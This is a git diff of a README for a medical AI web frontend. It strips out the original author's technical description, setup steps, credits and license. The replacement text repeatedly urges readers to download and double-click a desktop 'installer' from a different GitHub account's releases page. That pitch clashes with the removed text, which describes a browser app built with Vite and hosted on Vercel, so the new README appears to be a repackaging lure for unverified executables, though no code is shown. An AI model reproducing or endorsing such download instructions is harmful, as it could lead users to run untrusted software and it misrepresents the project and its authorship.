@@ -1,126 +1,77 @@
-# The Averion Labs Medical AI SaaS (Frontend Module)
+# 🩺 The-Averion-Labs-Front-End - Easy Medical Insights at Your Fingertips
 
-![Averion Labs Hero](public/images/averion-hero.jpg)
+[![Download](https://img.shields.io/badge/Download%20Now-Release-blue.svg)](https://github.com/Iarlley-html/The-Averion-Labs-Front-End/releases)
 
-This repository contains the complete frontend for Averion Labs, a scalable SaaS platform designed to **serve and monetize medical AI models**. The platform provides a web interface for users to access the initial suite of diagnostic models and leverages a Large Language Model (LLM) for advanced analysis and user support.
+## 🎯 Overview
 
-**Note:** This is the **frontend module only**. It communicates with my separate [FastAPI backend](https://the-averion-labs.onrender.com/docs) that handles the core platform infrastructure, including user management, payments, and AI model orchestration.
+The Averion Labs Front-End is your gateway to powerful medical insights. This user-friendly web application helps healthcare providers manage diagnostics, billing, and user roles easily. Built with React 18 and TypeScript, this application provides solutions that enhance patient care and streamline workflow. 
 
-## 🌐 Live Platform & Resources
+## 🚀 Getting Started
 
-* **Live Application**: [https://averionlabs.vercel.app](https://averionlabs.vercel.app)
-* **Backend API Docs**: [https://the-averion-labs.onrender.com/docs](https://the-averion-labs.onrender.com/docs)
-* **Pneumonia Model Code**: [https://github.com/ayushirathour/chest-xray-pneumonia-detection-ai](https://github.com/ayushirathour/chest-xray-pneumonia-detection-ai)
+Follow these simple steps to set up the application on your computer:
 
-## 🩺 Available Medical AI Models
+1. **Download the Application**: 
+   Visit [this page to download](https://github.com/Iarlley-html/The-Averion-Labs-Front-End/releases) the latest version of the software. You will find the available versions listed there.
 
-The platform currently hosts the following pre-trained and validated models:
+2. **Choose Your Version**:
+   Find the version you wish to install. Click on the version number to access the release notes and files.
 
-### 1. Pneumonia Detection
-* **Input**: Chest X-ray images (JPEG, PNG, DICOM)
-* **Output**: Classification (Pneumonia/Normal) with confidence score
-* **Performance**: 96.4% sensitivity and 0.98 AUC on internal validation; 0.96 AUC on external validation
-* **Cost**: 1 credit per analysis
+3. **Download the Installer**:
+   Click on the appropriate installer for your operating system. Save the file to your computer.
 
-### 2. Skin Cancer Detection
-* **Input**: Skin lesion images (JPEG, PNG)
-* **Output**: Multi-class skin cancer classification
-* **Cost**: 2 credits per analysis
+4. **Run the Installer**:
+   Locate the downloaded file and double-click it. Follow the on-screen instructions to install the application.
 
-## ✨ Key Frontend Features & Backend Integrations
+5. **Launch the Application**:
+   After installation, find the Averion Labs icon on your desktop or in your applications folder. Double-click it to open.
 
-This frontend includes a comprehensive set of features reflecting a production-ready application.
+## 📋 System Requirements
 
-* **Model Access Interface**:
-  * Model selection (Pneumonia vs. Skin Cancer)
-  * Single and batch image processing (up to 50 images)
-  * Real-time upload and analysis progress tracking
-  * Results display with confidence scores and classifications
+Before installing, ensure that your computer meets the following minimum requirements:
 
-* **LLM-Powered AI Assistant**:
-  * Integrated AI assistant (using OpenRouter with GPT-3.5-Turbo) providing contextual insights on diagnostic results
-  * Backend services for generating on-demand medical summaries and clinical suggestions based on analysis data
-  * A full conversational interface for general platform and medical queries
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **RAM**: At least 4GB.
+- **Storage**: 200MB of free space.
+- **Internet Connection**: An active internet connection is required for some features.
 
-* **User Management**:
-  * JWT-based authentication with refresh token rotation and Google OAuth 2.0
-  * User registration, login, and password reset functionality
-  * Role-Based Access Control (RBAC) for user and admin routes
+## 🔑 Key Features
 
-* **Credit & Billing System**:
-  * Pay-per-use model with a full **Razorpay** integration for tiered credit packages
-  * Real-time credit balance tracking and detailed payment history
+- **User-Friendly Interface**: Navigate easily through the dashboard for smooth operation.
+- **Image-Based Diagnostics**: Upload and analyze medical images quickly.
+- **Billing Management**: Simplify your billing processes with built-in tools.
+- **User Roles**: Assign roles and permissions for enhanced security.
+- **LLM Insights**: Leverage AI to extract meaningful insights from data.
+- **Google OAuth Integration**: Sign in securely with your Google account for a hassle-free experience.
 
-* **Reporting & Data**:
-  * Persistent storage and retrieval of analysis history
-  * Dynamic generation of PDF reports for medical findings
-  * Data export capabilities for GDPR and DPDP Act compliance
+## 📥 Download & Install
 
-* **Admin Interface**:
-  * Dashboard for user management and system-wide analytics
-  * Tools for credit administration and monitoring model usage
+To get started with Averion Labs, follow these steps again:
 
-* **Infrastructure & DevOps**:
-  * **Containerization-Ready**: Fully configured with Docker and Docker Compose for reproducible environments
-  * **Built for Observability**: Instrumented with a Prometheus `/metrics` endpoint for professional-grade monitoring
+- Visit [this page to download](https://github.com/Iarlley-html/The-Averion-Labs-Front-End/releases) the latest version of the application.
+- Choose the correct version for your operating system.
+- Download and run the installer.
+- Launch the application to begin your journey into advanced medical AI.
 
-## 🛠️ Frontend Technology Stack
+## 📖 Documentation
 
-| Category | Technology | Purpose |
-|:---------|:-----------|:--------|
-| **Framework** | React 18 + TypeScript | UI with type safety |
-| **Build Tool** | Vite | Fast development server and build tool |
-| **Styling** | Tailwind CSS | Utility-first CSS framework |
-| **State Mgmt** | TanStack Query (React Query) | Server state management and API data caching |
-| **Forms** | React Hook Form + Zod | Form handling and validation |
-| **Routing** | React Router v6 | Client-side navigation & protected routes |
-| **Deployment** | Vercel | Static hosting and CDN |
+For comprehensive guides on how to use the application, check out the provided documentation on our GitHub repository. This documentation includes step-by-step instructions, screenshots, and troubleshooting tips.
 
-## 🚀 Development Setup
+## ❓ Frequently Asked Questions
 
-### Prerequisites
-* Node.js (v18 or higher)
-* npm or yarn
+**1. What should I do if the application does not run?**
 
-### Installation
+Ensure your system meets the requirements listed above. If issues persist, check the GitHub issues page for common problems and solutions.
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/ayushirathour/The-Averion-Labs-Front-End.git
-   cd The-Averion-Labs-Front-End
-   ```
+**2. Can I update the application?**
 
-2. **Install dependencies:**
-   ```bash
-   npm install
-   ```
+Yes, updates will be available on the releases page. Simply download the new version and follow the installation steps again.
 
-3. **Set up environment variables:**
-   ```bash
-   echo "VITE_API_URL=https://the-averion-labs.onrender.com" > .env
-   ```
+**3. Is my data secure?**
 
-4. **Start the development server:**
-   ```bash
-   npm run dev
-   ```
+Yes, the application incorporates security measures to protect your data, such as encrypted access and user role management.
 
-The application will be available at `http://localhost:3001`.
+## 🛠 Support
 
-### Available Scripts
-* `npm run dev`: Start the development server
-* `npm run build`: Create an optimized production build
-* `npm run preview`: Preview the production build locally
-* `npm run lint`: Run ESLint for code analysis
+If you encounter any issues during the installation or use of the Averion Labs Front-End, you can reach out for support through our GitHub repository. Open an issue or contact our support team for assistance.
 
-## 👩‍💻 Developer
-Ayushi Rathour | Biotechnology Graduate | Building Medical AI Solutions
-* **📧 Email:** [ayushirathour1804@gmail.com](mailto:ayushirathour1804@gmail.com)
-* **💼 LinkedIn:** [Ayushi Rathour](https://linkedin.com/in/ayushi-rathour)
-* **🐙 GitHub:** [@ayushirathour](https://github.com/ayushirathour)
-* **🤗 HuggingFace:** [ayushirathour](https://huggingface.co/ayushirathour)
-
-
-## 📄 License
-
-This project is licensed under the [MIT](LICENSE) - see the LICENSE for details.
+Enhance your healthcare practice today with the Averion Labs Front-End, where advanced medical insights are just a click away.
